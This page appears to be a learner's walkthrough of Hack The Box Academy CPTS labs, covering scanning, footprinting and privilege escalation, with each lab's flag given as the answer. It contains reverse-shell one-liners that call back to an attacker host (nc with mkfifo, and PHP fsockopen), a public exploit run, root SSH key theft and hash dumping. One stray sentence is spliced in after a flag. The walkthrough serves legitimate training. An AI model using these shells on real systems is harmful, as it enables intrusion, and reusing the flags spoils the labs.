---
title: CPTS labs
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs

## [Getting Started](https://academy.hackthebox.com/module/details/77)

### Pentesting Basics

#### [Service scanning](https://academy.hackthebox.com/module/77/section/726)

**Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?**

```
sudo nmap -sC -sV -p8080 $ip 
```

**Results**: Apache Tomcat



**Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.**

```
sudo nmap -sC -sV $ip
```

**Results**: 2323


**List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.**

```
smbclient  /\/\10.129.125.178/\users -U bob
# password: Welcome1. Included in the path explanation

smb>dir
smb>cd flag
smb>get flag.txt
smb>quit
cat flag.txt
```

**Results**: dceece590f3284c3866305eb2473d099


#### [Web Enumeration](https://academy.hackthebox.com/module/77/section/728)

**Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.**

```
dirb http://94.237.55.246:55655/    
# From enumeration you can get to dirb http://94.237.55.246:55655/robots.txt
```

Go to http://94.237.55.246:55655/robots.txt and you will notice http://94.237.55.246:55655/admin-login-page.php

Visit it and, hardcoded in the site you will see:

```
                <!-- TODO: remove test credentials admin:password123 -->

```

Login into the app.

**Results**: HTB{w3b_3num3r4710n_r3v34l5_53cr375}There are many retired boxes on the Hack The Box platform that are great for practicing Metasploit. Some of these include, but not limited to:


#### [Public Exploits](https://academy.hackthebox.com/module/77/section/843)

Access to the web app at http://ip:36883

The title of the wordpress post is "Simple Backup Plugin 2.7.10", which is a well-known vulnerable plugin. 

```
searchsploit Simple Backup Plugin 2.7.10
```


```
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Simple Backup Plugin Python Exploit 2.7.10 - Path Traversa | php/webapps/51937.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```


```
sudo cp /usr/share/exploitdb/exploits/php/webapps/51937.txt .
mv 51937.txt 51937.py
chmod +x 51937.py
python ./51937.py http://83.136.255.162:36883/ "/flag.txt" 4
#  target_url = sys.argv[1]
#  file_name = sys.argv[2]
#  depth = int(sys.argv[3])
```


**Results**: HTB{my_f1r57_h4ck}


#### [Privilege Escalation](https://academy.hackthebox.com/module/77/section/844)

**SSH to $ip with user "user1" and password "password1". SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.**

```
ssh user1@$ip -p 31459
# password1

sudo -l
# User user1 may run the following commands on
#        ng-644144-gettingstartedprivesc-udbk3-5969ffb656-cp248:
#    (user2 : user2) NOPASSWD: /bin/bash

# One way: 
echo #!/bin/bash > lala.sh
echo cat /home/user2/flag.txt >> lala.sh
chmod +x lala.sh
sudo -u user2  /bin/bash lala.sh

# Another
sudo -u user2 /bin/bash -i
```


**Results**:  HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}


**Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.**

Once you are user2, go to /root:

```
cd /root
ls -la
```


```
drwxr-x--- 1 root user2 4096 Feb 12  2021 .
drwxr-xr-x 1 root root  4096 Jun  3 19:21 ..
-rwxr-x--- 1 root user2    5 Aug 19  2020 .bash_history
-rwxr-x--- 1 root user2 3106 Dec  5  2019 .bashrc
-rwxr-x--- 1 root user2  161 Dec  5  2019 .profile
drwxr-x--- 1 root user2 4096 Feb 12  2021 .ssh
-rwxr-x--- 1 root user2 1309 Aug 19  2020 .viminfo
-rw------- 1 root root    33 Feb 12  2021 flag.txt

```

So we have read access in .ssh folder. We can access and copy the private key 

```
cd .ssh
cat id_rsa
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
....
QfPM8OxSjcVJCpAAAAEXJvb3RANzZkOTFmZTVjMjcwAQ==
-----END OPENSSH PRIVATE KEY-----
```

In our attacker machine we save that id_rsa key in our folder

```
echo "the key" > id_rsa
```

And now we can login as root

```
ssh root@$ip -p 31459 -i id_rsa
```

And cat the flag:

```
cat /root/flag.txt 
```



**Results**:  HTB{pr1v1l363_35c4l4710n_2_r007}


### Attacking your first box

#### Nibbles - Enumeration

 **Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)**


```
sudo nmap -sC -sV $ip
```

**Results**:  2.4.18


#### [Nibbles - Initial Foothold](https://academy.hackthebox.com/module/77/section/852)

**Gain a foothold on the target and submit the user.txt flag**

Enumerate resources


```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H "HOST: $ip$"

dirb http://$ip/nibbleblog/
```

There are a lot of directory listing enabled. And eventually we can browser to:
http://$ip/nibbleblog/content/private/users.xml

We can identify the user admin.

![admin user](img/htb-nibble_00.png)

We could also enumerate http://$ip/nibbleblog/admin.php

Login access is admin:nibbles.

Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image

Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ 

Set a netcat listener

```
nc -lnvp 1234
```

Click on the reverse shell "image.php" and we will get a reverse shell.

```
whoami
#nibbler

cat /home/nibbler/user.txt
```



**Results**:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148


#### [Nibbles - Privilege Escalation](https://academy.hackthebox.com/module/77/section/853)

Escalate privileges and submit the root.txt flag.

```
cd /home/nibbler
```


```
sudo -l
```

Results:

```
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user.

```
unzip personal.zip
strings /home/nibbler/personal/stuff/monitor.sh
```


```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPattacker 8443 >/tmp/f' | tee -a monitor.sh
```

In the attacker machine, open a new netcat:

```
nc -lnvp 8443
```

Run monitor.sh with sudo

```
sudo ./monitor.sh
```

In the new netcat connection you are root.

```
cat /root/root.txt
```


**Results**: de5e5d6619862a8aa5b9b212314e0cdd


Alternative way: Metasploit 

```shell-session
exploit/multi/http/nibbleblog_file_upload
```


### [Knowledge Check](https://academy.hackthebox.com/module/77/section/859)

**Spawn the target, gain a foothold and submit the contents of the user.txt flag.**

```
sudo nmap -sC -sV $ip
```

Go to http://$ip/robots.txt

Go to http://$ip/admin

Enter admin:admin

Go to Edit Theme: http://$ip/admin/theme-edit.php

Add a pentesmonkey shell and set a netcat listener on port 1234

Add gettingstarte.htb to your hosts file

Open the blog and you will get a reverse shell

```
cat /home/mrb3n/user.txt
```

**Results**: 7002d65b149b0a4d19132a66feed21d8


**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**

Check out our permissions

```
sudo -l
```

Results:

```
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php

```

Grab a simple php reverse shell such as:

```
php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");'
```

Set up a netcat listener on port 4444:

```
nc -lnvp
```


Run as sudo:

```
sudo /usr/bin/php -r '$sock=fsockopen("$AttackerIP",4444);exec("/bin/sh <&3 >&3 2>&3");
```

You are root in the listener. Now

```
cat /root/root.txt
```

**Results**: f1fba6e9f71efb2630e6e34da6387842



## [Network Enumeration with Nmap](https://academy.hackthebox.com/module/details/19)

### Host Enumeration

#### [Host Discovery](https://academy.hackthebox.com/module/19/section/101)

**Based on the last result, find out which operating system it belongs to. Submit the name of the operating system as result.**


```
sudo nmap $ip -sn -oA host -PE --packet-trace --disable-arp-ping 
```

**Result**: Windows

#### [Host and Port Scanning](https://academy.hackthebox.com/module/19/section/102)


**Find all TCP ports on your target. Submit the total number of found TCP ports as the answer.**

```
nmap $ip
```

**Results**: 7


**Enumerate the hostname of your target and submit it as the answer. (case-sensitive):**

```
sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
```

**Results**: nix-nmap-default


#### [Saving the Results](https://academy.hackthebox.com/module/19/section/104)

 Perform a full TCP port scan on your target and create an HTML report. Submit the number of the highest port as the answer.

```
nmap $ip
```

Results: 31337


#### [Service Enumeration](https://academy.hackthebox.com/module/19/section/103)

Enumerate all ports and their services. One of the services contains the flag you have to submit as the answer.

```
sudo nmap $ip -Pn -sC -sV -p22,80,110,139,143,445,31337
```

Results: HTB{pr0F7pDv3r510nb4nn3r}


#### [Nmap Scripting Engine](https://academy.hackthebox.com/module/19/section/108)

**Use NSE and its scripts to find the flag that one of the services contain and submit it as the answer.**

```
sudo nmap $ip -p80 --script vuln
```

Result:

```
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.129.68.164
Host is up (0.047s latency).

PORT   STATE SERVICE
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /robots.txt: Robots file
```

Go to robots.txt and get the flag.

Results: HTB{873nniuc71bu6usbs1i96as6dsv26}


### Bypass Security Measures


#### [Firewall and IDS/IPS Evasion - Easy Lab](https://academy.hackthebox.com/module/19/section/117)

Our client wants to know if we can identify which operating system their provided machine is running on. Submit the OS name as the answer.

```
sudo nmap -sC -sV $ip -p80  -Pn --max-retries 3 --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
```

Results: Ubuntu



#### [Firewall and IDS/IPS Evasion - Medium Lab](https://academy.hackthebox.com/module/19/section/118)

After the configurations are transferred to the system, our client wants to know if it is possible to find out our target's DNS server version. Submit the DNS server version of the target as the answer.

```
sudo nmap -sU -p53 --script dns-nsid $ip 
```

Results: HTB{GoTtgUnyze9Psw4vGjcuMpHRp}


#### [Firewall and IDS/IPS Evasion - Hard Lab](https://academy.hackthebox.com/module/19/section/119)

 Now our client wants to know if it is possible to find out the version of the running services. Identify the version of service our client was talking about and submit the flag as the answer.

```
sudo nc -nv -p 53 $ip  50000 
```


Results: HTB{kjnsdf2n982n1827eh76238s98di1w6}



## [Footprinting](https://academy.hackthebox.com/module/details/112)

### Host Based Enumeration

#### FTP

**Which version of the FTP server is running on the target system? Submit the entire banner as the answer.**

```
nc -nv $ip 21
```

Results: InFreight FTP v1.1


Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.

```
ftp $ip
```

Enter user anonymous.

Enter password anonymous.

```
ftp> dir
ftp> get flag.txt
ftp> quit

cat flag.
```

Results: HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}


#### SMB

**What version of the SMB server is running on the target system? Submit the entire banner as the answer.**

```
sudo nmap $ip  -p445 -sV -A -sC
```

Results: Samba smbd 4.6.2


 **What is the name of the accessible share on the target?**

```
 smbclient  -L //$ip 
```

Results: sambashare


**Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.**

```
smbclient  //$ip/sambashare -U ""
dir
cd contents
ls
get flag.txt
quit
cat flag.txt
```

Results: HTB{o873nz4xdo873n4zo873zn4fksuhldsf}


**Find out which domain the server belongs to.**

```
rpcclient -U "" $ip
rpcclient $> querydominfo
```

Results: DEVOPS

**Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.**

```
rpcclient $> netsharegetinfo sambashare
```

Results: InFreight SMB v3.1



**What is the full system path of that specific share? (format: "/directory/names")**

```
rpcclient $> netsharegetinfo sambashare
```

Results: /home/sambauser


#### NFS

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.**

```
sudo nmap $ip -p111,2049 -sV -sC
showmount -e $ip 
mkdir target 
sudo mount -t nfs $ip:/ ./target -o nolock
cd target 
tree .
cat var/nfs/flag.txt 
```

Results: HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}

**Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.**

```
cat mnt/nfsshare/flag.txt 
```

Results: HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}


#### DNS

**Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**


```
dig any inlanefreight.htb @$ip
```

Result:  ns.inlanefreight.htb



**Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...))**

```
#First, we do an initial transfer zone
dig axfr inlanefreight.htb @$ip
```

Results:

```

; <<>> DiG 9.19.21-1-Debian <<>> axfr inlanefreight.htb @10.129.218.112
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	TXT	"MS=ms97310371"
inlanefreight.htb.	604800	IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.	604800	IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
app.inlanefreight.htb.	604800	IN	A	10.129.18.15
dev.inlanefreight.htb.	604800	IN	A	10.12.0.1
internal.inlanefreight.htb. 604800 IN	A	10.129.1.6
mail1.inlanefreight.htb. 604800	IN	A	10.129.18.201
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
;; WHEN: Wed Jul 31 13:57:45 EDT 2024
;; XFR size: 11 records (messages 1, bytes 560)

```


 With the result, now we can do a second transfer zone

```
dig axfr internal.inlanefreight.htb @$ip
```


Results:

```
; <<>> DiG 9.19.21-1-Debian <<>> axfr internal.inlanefreight.htb @10.129.218.112
;; global options: +cmd
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
internal.inlanefreight.htb. 604800 IN	TXT	"MS=ms97310371"
internal.inlanefreight.htb. 604800 IN	TXT	"HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}"
internal.inlanefreight.htb. 604800 IN	TXT	"atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
internal.inlanefreight.htb. 604800 IN	TXT	"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
internal.inlanefreight.htb. 604800 IN	NS	ns.inlanefreight.htb.
dc1.internal.inlanefreight.htb.	604800 IN A	10.129.34.16
dc2.internal.inlanefreight.htb.	604800 IN A	10.129.34.11
mail1.internal.inlanefreight.htb. 604800 IN A	10.129.18.200
ns.internal.inlanefreight.htb. 604800 IN A	127.0.0.1
vpn.internal.inlanefreight.htb.	604800 IN A	10.129.1.6
ws1.internal.inlanefreight.htb.	604800 IN A	10.129.1.34
ws2.internal.inlanefreight.htb.	604800 IN A	10.129.1.35
wsus.internal.inlanefreight.htb. 604800	IN A	10.129.18.2
internal.inlanefreight.htb. 604800 IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.129.218.112#53(10.129.218.112) (TCP)
;; WHEN: Wed Jul 31 13:58:29 EDT 2024
;; XFR size: 15 records (messages 1, bytes 677)
```

Then: HTB{DN5_z0N3_7r4N5F3r_iskdufhcnlu34}


**What is the IPv4 address of the hostname DC1?**

Get the answer from the response to the previous question. In this case: 10.129.34.16


What is the FQDN of the host where the last octet ends with "x.x.x.203"?

```
dnsenum --dnsserver 10.129.218.112 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
```

Results:

```
-----   dev.inlanefreight.htb   -----


Host's addresses:
__________________



Name Servers:
______________

ns.inlanefreight.htb.                    604800   IN    A         127.0.0.1


Mail (MX) Servers:
___________________



Trying Zone Transfers and getting Bind Versions:
_________________________________________________

unresolvable name: ns.inlanefreight.htb at /usr/bin/dnsenum line 892 thread 2.

Trying Zone Transfer for dev.inlanefreight.htb on ns.inlanefreight.htb ... 
AXFR record query failed: no nameservers


Brute forcing with /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt:
__________________________________________________________________________

dev1.dev.inlanefreight.htb.              604800   IN    A         10.12.3.6
ns.dev.inlanefreight.htb.                604800   IN    A         127.0.0.1
win2k.dev.inlanefreight.htb.             604800   IN    A        10.12.3.203

```

Therefore: win2k.dev.inlanefreight.htb

#### SMTP

**Enumerate the SMTP service and submit the banner, including its version as the answer.**

```
sudo nmap $ip -sC -sV -p25
```


Results: InFreight ESMTP v2.11


**Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.**

```
for user in $(cat ~/Downloads/footprintingusers.txt); do echo VRFY $user | nc -nv -w 6 $ip 25  ; done
```

Results: robin


#### IMAP / POP3

**Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.**

```
sudo nmap $ip -sV -p110,143,993,995 -sC
```

Results: InlaneFreight Ltd

**What is the FQDN that the IMAP and POP3 servers are assigned to?**

```
sudo nmap $ip -sV -p110,143,993,995 -sC
```

Results: dev.inlanefreight.htb


**Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})**

```
echo $ip inlanefreight.htb dev.inlanefreight.htb >> /etc/hosts
curl -k 'imaps://dev.inlanefreight.htb' --user robin:robin -v
```

```
* Host dev.inlanefreight.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.129.42.195
*   Trying 10.129.42.195:993...
* Connected to dev.inlanefreight.htb (10.129.42.195) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / x25519 / RSASSA-PSS
* Server certificate:
*  subject: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  start date: Nov  8 23:10:05 2021 GMT
*  expire date: Aug 23 23:10:05 2295 GMT
*  issuer: C=UK; ST=London; L=London; O=InlaneFreight Ltd; OU=DevOps Dep�artment; CN=dev.inlanefreight.htb; emailAddress=cto.dev@dev.inlanefreight.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB{roncfbw7iszerd7shni7jr2343zhrj}
> A001 CAPABILITY
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN
< A001 OK Pre-login capabilities listed, post-login capabilities have more.
> A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
< * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
< A002 OK Logged in
> A003 LIST "" *
< * LIST (\Noselect \HasChildren) "." DEV
* LIST (\Noselect \HasChildren) "." DEV
< * LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
* LIST (\Noselect \HasChildren) "." DEV.DEPARTMENT
< * LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
* LIST (\HasNoChildren) "." DEV.DEPARTMENT.INT
< * LIST (\HasNoChildren) "." INBOX
* LIST (\HasNoChildren) "." INBOX
< A003 OK List completed (0.009 + 0.000 + 0.008 secs).
* Connection #0 to host dev.inlanefreight.htb left intact

```

Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}

**What is the customized version of the POP3 server?**

```
openssl s_client -connect $ip:pop3s
```

Results: InFreight POP3 v9.188


**What is the admin email address?**

```
# Establish a imap connection
openssl s_client -connect $ip:imaps

# Login as user robin with password robin
a LOGIN robin robin

# List inboxes
a LIST "" *

# Select one of them
a SELECT DEV.DEPARTMENT.INT

# Retrieves the messages by ID
a FETCH 1 all

```

Results: devadmin@inlanefreight.htb


 **Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})**

```
# Establish a imap connection
openssl s_client -connect $ip:imaps

# Login as user robin with password robin
a LOGIN robin robin

# List inboxes
a LIST "" *

# Select one of them
a SELECT DEV.DEPARTMENT.INT

# Retrieve the messages by ID
a FETCH 1 all

# Retrieve the content of the message with id 1
a FETCH 1 BODY.PEEK[TEXT]
```

Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}

#### SNMP

**Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.**

```
snmpwalk -v2c -c public $ip
```

Results: devadmin@inlanefreight.htb

**What is the customized version of the SNMP server?**

```
snmpwalk -v2c -c public $ip
```

Results: InFreight SNMP v0.91


 **Enumerate the custom script that is running on the system and submit its output as the answer.**

```
snmpwalk -v2c -c public $ip
```

Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}

#### MySQL


**Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)**

```
sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn
```

Results: MySQL 8.0.27


**During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?**

```
mysql -u robin -probin -h $ip
select * from customers.myTable where name LIKE "Otto Lang";
```


Results: ultrices@google.htb

#### MSSQL

**Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.**

```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
```

Results: ILF-SQL-01


**Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.**

```
mssqlclient.py backdoor@$ip -windows-auth -p 1433

SELECT name FROM master.dbo.sysdatabases

```

Results: Employees

#### Oracle TNS

Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.

```
python3 ./odat.py all -s $ip
# With this we obtain the creds scott/tiger

# Now we connect to the database
sqlplus scott/tiger@$ip/XE as sysdba

# Extract Password Hashes
select name, password from sys.user$;
```

Results: E066D214D5421CCC

#### IPMI

**What username is configured for accessing the host via IPMI?**

```
sudo msfdb init
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
setg RHOSTS $ip
run
```

Results: admin

**What is the account's cleartext password?**

```
sudo msfdb init
msfconsole -q
use auxiliary/scanner/ipmi/ipmi_dumphashes
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

Results: trinity


### Skills assessment

#### Footprinting Lab - Easy

We were commissioned by the company `Inlanefreight Ltd` to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum. The administrators have stored a `flag.txt` file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.

**Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.**

```
ftp $ip -p 2121
# enter user `ceil` and password `qwer1234`

ls -la
cd .ssh
get id_rsa ~/.ssh/
quit

chmod 600 ~/.ssh/id_rsa
ssh -i ~/.ssh/id_rsa ceil@$ip
find / -name flag.txt 2>/dev/null
cat /home/flag/flag.txt
```

Results:  HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}


#### Footprinting Lab - Medium

This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.**

```
sudo nmap -sS -sV -top-ports 4000 $ip

# We will attack firts service 2049
showmount -e $ip
mkdir target-NFS
sudo mount -t nfs $ip:/ ./target-NFS/ -o nolock
cd target-NFS

sudo ls -la
sudo ls -la TechSupport
sudo cat TechSupport/ticket4238791283782.txt
```

Credentials are obtained for accessing a different service:

```
 5    user="alex"
 6    password="lol123!mD"
```


```
# Now we connect to 3389 RDP:
xfreerdp /cert:ignore /u:alex /p:"lol123\!mD" /v:$ip
```

A Windows connection opens up.

We browse the machine and find `C:\Users\alex\devshare\important` file, that contains the following creds:

```
sa:87N1ns@slls83
```

Right click on Microsoft SQL Server Management Studio and select "Execute as Administrator". Enter the creds `87N1ns@slls83`. Now we connect to the server:

![sql](img/htb-academy-footprinting-module_00.png) 

Browse around, but the final SQL query would be

```MSSQL
SELECT TOP (1000) [id]
      ,[name]
      ,[password]
  FROM [accounts].[dbo].[devsacc]
```

Results: lnch7ehrdn43i7AoqVPK4zWR

#### Footprinting Lab - Hard

The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named `HTB` was also created here, whose credentials we need to access.

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.**

```
# Enumerate TCP and UDP
sudo nmap -sS -sV -top-ports 4000 $ip
sudo nmap $ip -sU   
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

We start with SNMP vulnerabilities:

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
```

In the result, you can spot the `community string` `backup`. Now, we can use braa:

```
braa backup@$ip:.1.3.6.* 
```

In the results a credential is showed:

```
tom NMds732Js2761
```

We use that credential to login into the IMAP server:

```
openssl s_client -connect $ip:imaps

a LOGIN tom NMds732Js2761

a SELECT INBOX
a FETCH 1 all
a FETCH 1 BODY.PEEK[TEXT]
```

And we obtain a OPENSSH PRIVATE KEY that we save into our ~/.ssh folder. We give 600 permission to the file id_rsa.

```
chmod 600 id_rsa
ssh tom@$ip
```

Now, we are in. I had a look at the history file and saw a MySQL connection:

```
history
```

I decided to have a look at it:

```
mysql -u tom -p

#Enter the password NMds732Js2761
```

```
show databases;
use users;
show tables;
select * from users;
```


Results: cr3n4o7rzse7rzhnckhssncif7ds



## [Information Gathering - Web Edition](https://academy.hackthebox.com/module/details/144)


### WHOIS

#### Utilizing WHOIS

**Perform a WHOIS lookup against the paypal.com domain. What is the registrar Internet Assigned Numbers Authority (IANA) ID number?**

```
whoid paypal.com
```

Results: 292

**What is the admin email contact for the tesla.com domain (also in-scope for the Tesla bug bounty program)?**

```
whoid tesla.com
```

Results: admin@dnstinations.com



### DNS & Subdomains

#### Digging DNS


**Which IP address maps to inlanefreight.com?**

```
dig +short inlanefreight.com
```

Results: 134.209.24.248



**Which domain is returned when querying the PTR record for 134.209.24.248?**

```
dig -x 134.209.24.248 @1.1.1.1
```

Results:  inlanefreight.com

What is the full domain returned when you query the mail records for facebook.com?

```
dig MX facebook.com
```

